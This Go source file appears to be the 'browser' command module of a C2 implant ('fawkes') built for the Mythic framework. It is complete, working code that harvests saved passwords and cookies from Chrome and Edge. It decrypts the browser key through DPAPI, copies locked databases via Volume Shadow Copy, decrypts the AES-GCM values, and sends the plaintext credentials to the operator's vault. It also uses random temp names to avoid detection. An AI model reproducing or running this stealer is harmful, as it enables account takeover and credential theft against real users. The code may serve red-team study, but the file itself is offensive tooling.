//go:build windows

package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	_ "modernc.org/sqlite"

	"golang.org/x/sys/windows"
)

type BrowserCommand struct{}

func (c *BrowserCommand) Name() string {
	return "browser"
}

func (c *BrowserCommand) Description() string {
	return "Harvest saved credentials from Chromium-based browsers (Chrome, Edge)"
}

type browserArgs struct {
	Action  string `json:"action"`  // passwords (default), cookies
	Browser string `json:"browser"` // all (default), chrome, edge
}

type browserCred struct {
	Browser  string
	URL      string
	Username string
	Password string
}

type browserCookie struct {
	Browser  string
	Host     string
	Name     string
	Value    string
	Path     string
	Expires  int64
	Secure   bool
	HTTPOnly bool
}

func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
	var args browserArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Action = "passwords"
			args.Browser = "all"
		}
	}

	if args.Action == "" {
		args.Action = "passwords"
	}
	if args.Browser == "" {
		args.Browser = "all"
	}

	switch strings.ToLower(args.Action) {
	case "passwords":
		return browserPasswords(args)
	case "cookies":
		return browserCookies(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords, cookies", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// browserPaths returns the User Data directories for supported browsers
func browserPaths(browser string) map[string]string {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return nil
	}

	all := map[string]string{
		"Chrome": filepath.Join(localAppData, "Google", "Chrome", "User Data"),
		"Edge":   filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
	}

	switch strings.ToLower(browser) {
	case "chrome":
		return map[string]string{"Chrome": all["Chrome"]}
	case "edge":
		return map[string]string{"Edge": all["Edge"]}
	default:
		return all
	}
}

// getEncryptionKey reads and decrypts the browser's AES encryption key
func getEncryptionKey(userDataDir string) ([]byte, error) {
	localStatePath := filepath.Join(userDataDir, "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("read Local State: %w", err)
	}

	var localState struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("parse Local State: %w", err)
	}

	if localState.OsCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key in Local State")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("base64 decode key: %w", err)
	}

	// Strip "DPAPI" prefix (5 bytes)
	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
		return nil, fmt.Errorf("unexpected key prefix (not DPAPI)")
	}
	encryptedKey = encryptedKey[5:]

	// Decrypt with DPAPI
	return dpapiDecrypt(encryptedKey)
}

// dpapiDecrypt calls CryptUnprotectData to decrypt DPAPI-protected data
func dpapiDecrypt(data []byte) ([]byte, error) {
	dataIn := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}
	var dataOut windows.DataBlob

	err := windows.CryptUnprotectData(&dataIn, nil, nil, 0, nil, 0, &dataOut)
	if err != nil {
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}

	// Copy output and free the system-allocated buffer
	result := make([]byte, dataOut.Size)
	copy(result, unsafe.Slice(dataOut.Data, dataOut.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(dataOut.Data)))

	return result, nil
}

// decryptPassword decrypts a Chrome AES-GCM encrypted password
func decryptPassword(encryptedPassword []byte, key []byte) (string, error) {
	if len(encryptedPassword) < 15 {
		return "", fmt.Errorf("encrypted data too short")
	}

	// Check for "v10" or "v11" prefix (AES-GCM encryption)
	prefix := string(encryptedPassword[:3])
	if prefix == "v10" || prefix == "v11" {
		encryptedPassword = encryptedPassword[3:]

		// 12-byte nonce + ciphertext (includes 16-byte GCM tag)
		if len(encryptedPassword) < 12+16 {
			return "", fmt.Errorf("encrypted data too short for AES-GCM")
		}

		nonce := encryptedPassword[:12]
		ciphertext := encryptedPassword[12:]

		block, err := aes.NewCipher(key)
		if err != nil {
			return "", fmt.Errorf("create AES cipher: %w", err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", fmt.Errorf("create GCM: %w", err)
		}

		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "", fmt.Errorf("GCM decrypt: %w", err)
		}

		return string(plaintext), nil
	}

	// Legacy DPAPI-only encryption (no v10/v11 prefix)
	plaintext, err := dpapiDecrypt(encryptedPassword)
	if err != nil {
		return "", fmt.Errorf("DPAPI decrypt: %w", err)
	}
	return string(plaintext), nil
}

// copyFile copies src to dst for safe reading of locked databases.
// First tries CreateFileW with full sharing flags to bypass browser locks.
// Falls back to esentutl /y /vss which uses Volume Shadow Copy for
// exclusively-locked files (Chrome/Edge lock Cookies DB while running).
func copyFile(src, dst string) error {
	srcPtr, err := windows.UTF16PtrFromString(src)
	if err != nil {
		return err
	}
	h, err := windows.CreateFile(
		srcPtr,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err == nil {
		in := os.NewFile(uintptr(h), src)
		defer in.Close()
		out, outErr := os.Create(dst)
		if outErr != nil {
			return outErr
		}
		defer out.Close()
		_, copyErr := io.Copy(out, in)
		return copyErr
	}

	// Fallback: esentutl /y /vss copies via Volume Shadow Copy
	_, vssErr := execCmdTimeout("esentutl", "/y", "/vss", src, "/d", dst)
	if vssErr == nil {
		return nil
	}
	// Return original CreateFile error as it's more descriptive
	return fmt.Errorf("open %s: %w (VSS fallback also failed: %v)", filepath.Base(src), err, vssErr)
}

// findProfiles returns profile directories containing Login Data
func findProfiles(userDataDir string) []string {
	var profiles []string

	// Check Default profile
	defaultLogin := filepath.Join(userDataDir, "Default", "Login Data")
	if _, err := os.Stat(defaultLogin); err == nil {
		profiles = append(profiles, filepath.Join(userDataDir, "Default"))
	}

	// Check numbered profiles (Profile 1, Profile 2, etc.)
	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			loginPath := filepath.Join(userDataDir, entry.Name(), "Login Data")
			if _, err := os.Stat(loginPath); err == nil {
				profiles = append(profiles, filepath.Join(userDataDir, entry.Name()))
			}
		}
	}

	return profiles
}

func browserPasswords(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return structs.CommandResult{
			Output:    "Could not determine LOCALAPPDATA path",
			Status:    "error",
			Completed: true,
		}
	}

	var allCreds []browserCred
	var errors []string

	for browserName, userDataDir := range paths {
		// Check if browser is installed
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		// Get the encryption key
		key, err := getEncryptionKey(userDataDir)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		// Find all profiles
		profiles := findProfiles(userDataDir)
		if len(profiles) == 0 {
			errors = append(errors, fmt.Sprintf("%s: no profiles with Login Data found", browserName))
			continue
		}

		for _, profileDir := range profiles {
			loginDataPath := filepath.Join(profileDir, "Login Data")

			// Copy to temp file to avoid database lock — random name (no distinctive pattern)
			tf, tfErr := os.CreateTemp("", "")
			if tfErr != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): create temp: %v", browserName, filepath.Base(profileDir), tfErr))
				continue
			}
			tmpFile := tf.Name()
			tf.Close()
			if err := copyFile(loginDataPath, tmpFile); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): copy Login Data: %v", browserName, filepath.Base(profileDir), err))
				continue
			}

			creds, err := readLoginData(tmpFile, key, browserName, filepath.Base(profileDir))
			os.Remove(tmpFile)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, filepath.Base(profileDir), err))
				continue
			}
			allCreds = append(allCreds, creds...)
		}
	}

	// Format output
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Credentials (%d found) ===\n\n", len(allCreds)))

	for _, cred := range allCreds {
		sb.WriteString(fmt.Sprintf("Browser:  %s\n", cred.Browser))
		sb.WriteString(fmt.Sprintf("URL:      %s\n", cred.URL))
		sb.WriteString(fmt.Sprintf("Username: %s\n", cred.Username))
		if cred.Password != "" {
			sb.WriteString(fmt.Sprintf("Password: %s\n", cred.Password))
		} else {
			sb.WriteString("Password: [decryption failed]\n")
		}
		sb.WriteString("\n")
	}

	if len(errors) > 0 {
		sb.WriteString("--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	if len(allCreds) == 0 && len(errors) == 0 {
		sb.WriteString("No Chromium-based browsers found or no saved credentials.\n")
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}

	// Report decrypted passwords to Mythic credential vault
	var mythicCreds []structs.MythicCredential
	for _, cred := range allCreds {
		if cred.Password != "" && cred.Username != "" {
			mythicCreds = append(mythicCreds, structs.MythicCredential{
				CredentialType: "plaintext",
				Realm:          cred.URL,
				Account:        cred.Username,
				Credential:     cred.Password,
				Comment:        fmt.Sprintf("browser (%s)", cred.Browser),
			})
		}
	}
	if len(mythicCreds) > 0 {
		result.Credentials = &mythicCreds
	}
	return result
}

func readLoginData(dbPath string, key []byte, browserName, profileName string) ([]browserCred, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open database: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND length(password_value) > 0")
	if err != nil {
		return nil, fmt.Errorf("query logins: %w", err)
	}
	defer rows.Close()

	var creds []browserCred
	label := browserName
	if profileName != "Default" {
		label = fmt.Sprintf("%s (%s)", browserName, profileName)
	}

	for rows.Next() {
		var url, username string
		var passwordBlob []byte

		if err := rows.Scan(&url, &username, &passwordBlob); err != nil {
			continue
		}

		if len(passwordBlob) == 0 {
			continue
		}

		password, err := decryptPassword(passwordBlob, key)
		if err != nil {
			password = ""
		}

		// Skip entries with no username and no password
		if username == "" && password == "" {
			continue
		}

		creds = append(creds, browserCred{
			Browser:  label,
			URL:      url,
			Username: username,
			Password: password,
		})
	}

	return creds, nil
}

// findCookieProfiles returns profile directories containing Cookies or Network/Cookies
func findCookieProfiles(userDataDir string) []string {
	var profiles []string

	checkProfile := func(dir string) {
		// Chrome 96+ stores cookies in Network/Cookies
		networkCookies := filepath.Join(dir, "Network", "Cookies")
		if _, err := os.Stat(networkCookies); err == nil {
			profiles = append(profiles, dir)
			return
		}
		// Older versions store in profile/Cookies
		cookies := filepath.Join(dir, "Cookies")
		if _, err := os.Stat(cookies); err == nil {
			profiles = append(profiles, dir)
		}
	}

	checkProfile(filepath.Join(userDataDir, "Default"))

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			checkProfile(filepath.Join(userDataDir, entry.Name()))
		}
	}

	return profiles
}

// cookieDBPath returns the path to the Cookies database for a profile
func cookieDBPath(profileDir string) string {
	// Chrome 96+ path
	networkPath := filepath.Join(profileDir, "Network", "Cookies")
	if _, err := os.Stat(networkPath); err == nil {
		return networkPath
	}
	return filepath.Join(profileDir, "Cookies")
}

func browserCookies(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return structs.CommandResult{
			Output:    "Could not determine LOCALAPPDATA path",
			Status:    "error",
			Completed: true,
		}
	}

	var allCookies []browserCookie
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		key, err := getEncryptionKey(userDataDir)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		profiles := findCookieProfiles(userDataDir)
		if len(profiles) == 0 {
			errors = append(errors, fmt.Sprintf("%s: no profiles with Cookies found", browserName))
			continue
		}

		for _, profileDir := range profiles {
			dbPath := cookieDBPath(profileDir)

			tf, tfErr := os.CreateTemp("", "")
			if tfErr != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): create temp: %v", browserName, filepath.Base(profileDir), tfErr))
				continue
			}
			tmpFile := tf.Name()
			tf.Close()
			if err := copyFile(dbPath, tmpFile); err != nil {
				os.Remove(tmpFile)
				errors = append(errors, fmt.Sprintf("%s (%s): copy Cookies: %v", browserName, filepath.Base(profileDir), err))
				continue
			}

			cookies, err := readCookieData(tmpFile, key, browserName, filepath.Base(profileDir))
			os.Remove(tmpFile)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, filepath.Base(profileDir), err))
				continue
			}
			allCookies = append(allCookies, cookies...)
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Cookies (%d found) ===\n\n", len(allCookies)))

	for _, c := range allCookies {
		flags := ""
		if c.Secure {
			flags += " Secure"
		}
		if c.HTTPOnly {
			flags += " HttpOnly"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s  %s=%s  (path=%s%s)\n",
			c.Browser, c.Host, c.Name, truncStr(c.Value, 80), c.Path, flags))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	if len(allCookies) == 0 && len(errors) == 0 {
		sb.WriteString("No Chromium-based browsers found or no cookies.\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func readCookieData(dbPath string, key []byte, browserName, profileName string) ([]browserCookie, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open database: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 0")
	if err != nil {
		return nil, fmt.Errorf("query cookies: %w", err)
	}
	defer rows.Close()

	var cookies []browserCookie
	label := browserName
	if profileName != "Default" {
		label = fmt.Sprintf("%s (%s)", browserName, profileName)
	}

	for rows.Next() {
		var host, name, path string
		var encValue []byte
		var expiresUTC int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&host, &name, &encValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
			continue
		}

		if len(encValue) == 0 {
			continue
		}

		value, err := decryptPassword(encValue, key)
		if err != nil || value == "" {
			continue
		}

		cookies = append(cookies, browserCookie{
			Browser:  label,
			Host:     host,
			Name:     name,
			Value:    value,
			Path:     path,
			Expires:  expiresUTC,
			Secure:   isSecure != 0,
			HTTPOnly: isHTTPOnly != 0,
		})
	}

	return cookies, nil
}
